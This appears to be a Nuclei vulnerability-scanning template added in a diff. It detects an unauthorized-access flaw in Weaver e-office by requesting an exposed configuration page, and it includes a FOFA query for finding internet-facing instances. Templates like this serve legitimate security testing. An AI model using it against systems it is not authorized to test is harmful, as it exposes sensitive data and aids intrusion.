@@ -1,0 +1,32 @@
+id: 泛微e-office 未授权访问
+time: '2023-10-18'
+
+
+info:
+  name: 泛微e-office 未授权访问
+  severity: high
+  description:  泛微e-office是一种企业办公自动化软件解决方案，由中国的泛微网络科技股份有限公司开发和提供。它旨在帮助企业提高办公效率、优化业务流程和信息管理。泛微e-office存在未授权访问，攻击者可以访问页面获取敏感信息。
+  reference: https://github.com/wy876/POC/tree/main
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: (body="login.php"&&body="eoffice")||body="/general/login/index.php"
+  
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/building/backmgr/urlpage/mobileurl/config_2.php" 
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ServceID"
+          - "连接测试"  
+
+      - type: status
+        status:
+          - 200
